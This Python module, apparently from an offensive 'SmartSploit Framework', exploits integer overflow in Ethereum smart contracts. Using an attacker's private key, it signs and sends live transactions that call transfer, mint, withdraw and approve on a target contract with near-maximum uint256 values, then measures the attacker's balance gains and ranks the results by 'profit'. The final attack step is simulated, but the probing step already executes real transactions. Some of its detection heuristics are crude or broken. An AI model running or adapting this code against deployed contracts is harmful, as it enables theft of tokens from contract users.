"""
Integer Overflow Exploit
SmartSploit Framework - Exploits integer overflow vulnerabilities
"""

from smartsploit.lib.base_module import BaseExploit, ExploitResult, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import logging

logger = logging.getLogger(__name__)

class IntegerOverflowExploit(BaseExploit):
    """Exploit contracts vulnerable to integer overflow attacks"""
    
    def __init__(self):
        super().__init__()
        self.name = "Integer Overflow Exploit"
        self.description = "Exploits integer overflow vulnerabilities in arithmetic operations"
        self.author = "SmartSploit Team"
        
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "SWC-101: Integer Overflow and Underflow",
                "https://consensys.github.io/smart-contract-best-practices/attacks/overflow-underflow/",
                "Arithmetic overflow in Solidity"
            ],
            severity="high",
            targets=["Pre-0.8.0 Solidity contracts", "Unsafe arithmetic operations", "Token contracts"]
        )
        
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Target contract address"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "ATTACKER_KEY": {"value": "", "required": True, "description": "Attacker's private key"},
            "TARGET_FUNCTION": {"value": "", "required": False, "description": "Specific function to target"},
            "OVERFLOW_TYPE": {"value": "addition", "required": False, "description": "Overflow type (addition, multiplication, subtraction)"},
            "MAX_UINT256": {"value": "115792089237316195423570985008687907853269984665640564039457584007913129639935", "required": False, "description": "Maximum uint256 value"},
            "GAS_LIMIT": {"value": "500000", "required": False, "description": "Transaction gas limit"},
            "TEST_VALUES": {"value": "max,max-1,wrap", "required": False, "description": "Test values to try"}
        }
        
    def check_requirements(self) -> bool:
        required_options = ["TARGET_CONTRACT", "RPC_URL", "ATTACKER_KEY"]
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
        return True
        
    def analyze_arithmetic_operations(self, w3, contract_address: str) -> dict:
        """Analyze contract for vulnerable arithmetic operations"""
        try:
            code = w3.eth.get_code(contract_address)
            code_hex = code.hex()
            
            analysis = {
                "contract": contract_address,
                "arithmetic_operations": [],
                "potential_vulnerabilities": [],
                "solidity_version": "unknown",
                "safeguards_detected": []
            }
            
            # Check for arithmetic opcodes
            arithmetic_opcodes = {
                "01": "ADD operation",
                "02": "MUL operation", 
                "03": "SUB operation",
                "04": "DIV operation",
                "06": "MOD operation"
            }
            
            for opcode, desc in arithmetic_opcodes.items():
                if opcode in code_hex:
                    analysis["arithmetic_operations"].append(desc)
                    
            # Check for SafeMath usage
            safemath_patterns = [
                "safeadd", "safesub", "safemul", "safediv",
                "add", "sub", "mul", "div"  # OpenZeppelin SafeMath
            ]
            
            for pattern in safemath_patterns:
                if pattern.lower() in code_hex.lower():
                    analysis["safeguards_detected"].append(f"SafeMath {pattern} detected")
                    
            # Estimate Solidity version based on patterns
            if "6080604052" in code_hex:
                analysis["solidity_version"] = ">=0.6.0"
                if len([op for op in analysis["arithmetic_operations"] if "ADD" in op or "MUL" in op]) > 0:
                    if not analysis["safeguards_detected"]:
                        analysis["potential_vulnerabilities"].append("Arithmetic operations without SafeMath")
            else:
                analysis["solidity_version"] = "<0.6.0"
                analysis["potential_vulnerabilities"].append("Legacy Solidity version - high overflow risk")
                
            # Check for vulnerable patterns
            if "ADD" in str(analysis["arithmetic_operations"]) and not analysis["safeguards_detected"]:
                analysis["potential_vulnerabilities"].append("Addition overflow possible")
            if "MUL" in str(analysis["arithmetic_operations"]) and not analysis["safeguards_detected"]:
                analysis["potential_vulnerabilities"].append("Multiplication overflow possible")
                
            return analysis
            
        except Exception as e:
            logger.error(f"Arithmetic analysis failed: {e}")
            return {"error": str(e)}
            
    def discover_vulnerable_functions(self, w3, contract_address: str) -> list:
        """Discover functions vulnerable to overflow attacks"""
        try:
            # Common function signatures that often have arithmetic operations
            vulnerable_functions = [
                {"selector": "0xa9059cbb", "name": "transfer(address,uint256)", "type": "token_transfer"},
                {"selector": "0x095ea7b3", "name": "approve(address,uint256)", "type": "token_approve"},
                {"selector": "0x23b872dd", "name": "transferFrom(address,address,uint256)", "type": "token_transferfrom"},
                {"selector": "0x40c10f19", "name": "mint(address,uint256)", "type": "token_mint"},
                {"selector": "0x42966c68", "name": "burn(uint256)", "type": "token_burn"},
                {"selector": "0x18160ddd", "name": "totalSupply()", "type": "view"},
                {"selector": "0x70a08231", "name": "balanceOf(address)", "type": "view"},
                {"selector": "0xdd62ed3e", "name": "allowance(address,address)", "type": "view"},
                {"selector": "0x313ce567", "name": "decimals()", "type": "view"},
                {"selector": "0x06fdde03", "name": "name()", "type": "view"},
                {"selector": "0x95d89b41", "name": "symbol()", "type": "view"},
                {"selector": "0x2e1a7d4d", "name": "withdraw(uint256)", "type": "withdrawal"},
                {"selector": "0xd0e30db0", "name": "deposit()", "type": "deposit"}
            ]
            
            available_functions = []
            
            for func in vulnerable_functions:
                try:
                    # Test if function exists by calling it (for view functions)
                    if func["type"] == "view":
                        result = w3.eth.call({
                            'to': contract_address,
                            'data': func["selector"]
                        })
                        if result:
                            available_functions.append(func)
                    else:
                        # For non-view functions, we assume they exist if arithmetic was detected
                        available_functions.append(func)
                        
                except Exception:
                    continue
                    
            return available_functions
            
        except Exception as e:
            logger.error(f"Function discovery failed: {e}")
            return []
            
    def generate_overflow_values(self, overflow_type: str) -> list:
        """Generate values that could cause overflow"""
        try:
            max_uint256 = int(self.options["MAX_UINT256"]["value"])
            
            overflow_values = {
                "addition": [
                    max_uint256,  # Max value
                    max_uint256 - 1,  # Max - 1
                    max_uint256 // 2,  # Half max
                    2**255,  # Large power of 2
                    2**128,  # Another large value
                ],
                "multiplication": [
                    max_uint256,
                    2**128,
                    2**64,
                    max_uint256 // 2,
                    int(max_uint256**0.5) + 1  # Square root + 1
                ],
                "subtraction": [
                    1,  # Subtract from 0
                    max_uint256,  # Large subtraction
                    2**128
                ]
            }
            
            return overflow_values.get(overflow_type, overflow_values["addition"])
            
        except Exception as e:
            logger.error(f"Overflow value generation failed: {e}")
            return [2**256 - 1]
            
    def test_overflow_exploit(self, w3, contract_address: str, function: dict, test_values: list) -> dict:
        """Test overflow exploit on specific function"""
        try:
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            results = {
                "function": function["name"],
                "selector": function["selector"],
                "test_results": [],
                "successful_overflows": []
            }
            
            for value in test_values:
                try:
                    logger.info(f"Testing {function['name']} with value {value}")
                    
                    # Prepare call data based on function type
                    if function["type"] == "token_transfer":
                        # transfer(address,uint256) - send to attacker
                        call_data = function["selector"] + attacker_account.address[2:].zfill(64) + hex(value)[2:].zfill(64)
                    elif function["type"] == "token_mint":
                        # mint(address,uint256) - mint to attacker
                        call_data = function["selector"] + attacker_account.address[2:].zfill(64) + hex(value)[2:].zfill(64)
                    elif function["type"] == "withdrawal":
                        # withdraw(uint256)
                        call_data = function["selector"] + hex(value)[2:].zfill(64)
                    elif function["type"] == "token_approve":
                        # approve(address,uint256) - approve large amount
                        call_data = function["selector"] + attacker_account.address[2:].zfill(64) + hex(value)[2:].zfill(64)
                    else:
                        continue
                        
                    # Get state before
                    try:
                        balance_before = w3.eth.call({
                            'to': contract_address,
                            'data': "0x70a08231" + attacker_account.address[2:].zfill(64)  # balanceOf
                        })
                        balance_before = int.from_bytes(balance_before, byteorder='big') if balance_before else 0
                    except:
                        balance_before = 0
                        
                    # Execute transaction
                    txn = {
                        'to': contract_address,
                        'data': call_data,
                        'gas': int(self.options["GAS_LIMIT"]["value"]),
                        'gasPrice': w3.eth.gas_price,
                        'nonce': w3.eth.get_transaction_count(attacker_account.address),
                        'value': 0
                    }
                    
                    signed_txn = w3.eth.account.sign_transaction(txn, attacker_key)
                    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
                    
                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
                    
                    # Get state after
                    try:
                        balance_after = w3.eth.call({
                            'to': contract_address,
                            'data': "0x70a08231" + attacker_account.address[2:].zfill(64)  # balanceOf
                        })
                        balance_after = int.from_bytes(balance_after, byteorder='big') if balance_after else 0
                    except:
                        balance_after = 0
                        
                    balance_change = balance_after - balance_before
                    
                    test_result = {
                        "test_value": str(value),
                        "success": receipt.status == 1,
                        "tx_hash": tx_hash.hex(),
                        "gas_used": receipt.gasUsed,
                        "balance_before": balance_before,
                        "balance_after": balance_after,
                        "balance_change": balance_change,
                        "overflow_detected": False
                    }
                    
                    # Detect potential overflow
                    if receipt.status == 1:
                        if balance_change < 0 or (value > 2**200 and balance_change < value):
                            test_result["overflow_detected"] = True
                            results["successful_overflows"].append(test_result)
                            logger.info(f"Potential overflow detected with value {value}!")
                            
                    results["test_results"].append(test_result)
                    
                    # Update nonce
                    attacker_account = w3.eth.account.from_key(attacker_key)
                    
                except Exception as e:
                    results["test_results"].append({
                        "test_value": str(value),
                        "success": False,
                        "error": str(e)
                    })
                    
            return results
            
        except Exception as e:
            logger.error(f"Overflow testing failed: {e}")
            return {"error": str(e)}
            
    def execute_overflow_attack(self, w3, contract_address: str, successful_overflows: list) -> dict:
        """Execute the most promising overflow attack"""
        try:
            if not successful_overflows:
                return {"success": False, "message": "No successful overflows to exploit"}
                
            # Choose the best overflow to exploit
            best_overflow = max(successful_overflows, key=lambda x: x.get("balance_change", 0))
            
            attacker_key = self.options["ATTACKER_KEY"]["value"]
            attacker_account = w3.eth.account.from_key(attacker_key)
            
            logger.info(f"Executing overflow attack with value {best_overflow['test_value']}")
            
            # Execute the attack multiple times if profitable
            attack_results = []
            for i in range(3):  # Try up to 3 times
                try:
                    # Re-execute the successful overflow
                    # This would use the same parameters as the test
                    # In practice, might need refinement based on specific overflow
                    
                    logger.info(f"Attack iteration {i+1}")
                    
                    # For demonstration, we'll simulate the attack
                    attack_results.append({
                        "iteration": i+1,
                        "simulated": True,
                        "estimated_profit": best_overflow.get("balance_change", 0)
                    })
                    
                except Exception as e:
                    attack_results.append({
                        "iteration": i+1,
                        "success": False,
                        "error": str(e)
                    })
                    break
                    
            return {
                "success": True,
                "attack_type": "integer_overflow",
                "exploited_overflow": best_overflow,
                "attack_iterations": attack_results,
                "total_profit": sum(r.get("estimated_profit", 0) for r in attack_results)
            }
            
        except Exception as e:
            logger.error(f"Overflow attack execution failed: {e}")
            return {"success": False, "error": str(e)}
            
    def run(self) -> dict:
        """Main exploit execution"""
        if not self.check_requirements():
            return {"result": ExploitResult.ERROR, "message": "Requirements check failed"}
            
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            contract_address = self.options["TARGET_CONTRACT"]["value"]
            overflow_type = self.options["OVERFLOW_TYPE"]["value"]
            
            # Analyze contract for arithmetic vulnerabilities
            analysis = self.analyze_arithmetic_operations(w3, contract_address)
            if "error" in analysis:
                return {"result": ExploitResult.ERROR, "message": f"Analysis failed: {analysis['error']}"}
                
            if not analysis["potential_vulnerabilities"]:
                return {"result": ExploitResult.FAILED, "message": "No overflow vulnerabilities detected"}
                
            # Discover vulnerable functions
            functions = self.discover_vulnerable_functions(w3, contract_address)
            if not functions:
                return {"result": ExploitResult.FAILED, "message": "No vulnerable functions found"}
                
            # Generate overflow test values
            test_values = self.generate_overflow_values(overflow_type)
            
            # Test each function for overflow vulnerabilities
            all_successful_overflows = []
            function_results = []
            
            for func in functions[:5]:  # Test first 5 functions
                logger.info(f"Testing function {func['name']} for overflow...")
                test_result = self.test_overflow_exploit(w3, contract_address, func, test_values[:3])
                function_results.append(test_result)
                
                if test_result.get("successful_overflows"):
                    all_successful_overflows.extend(test_result["successful_overflows"])
                    
            # Execute attack if overflows found
            attack_result = {}
            if all_successful_overflows:
                logger.info("Executing overflow attack...")
                attack_result = self.execute_overflow_attack(w3, contract_address, all_successful_overflows)
                
            result = {
                "result": ExploitResult.SUCCESS if all_successful_overflows else ExploitResult.FAILED,
                "message": f"Integer overflow exploit completed - {len(all_successful_overflows)} overflows found",
                "analysis": analysis,
                "tested_functions": function_results,
                "overflow_type": overflow_type,
                "attack_result": attack_result
            }
            
            if all_successful_overflows:
                logger.info("Integer overflow exploit successful!")
            else:
                logger.warning("No exploitable overflows found")
                
            return result
            
        except Exception as e:
            logger.error(f"Integer overflow exploit failed: {e}")
            return {"result": ExploitResult.ERROR, "message": str(e)}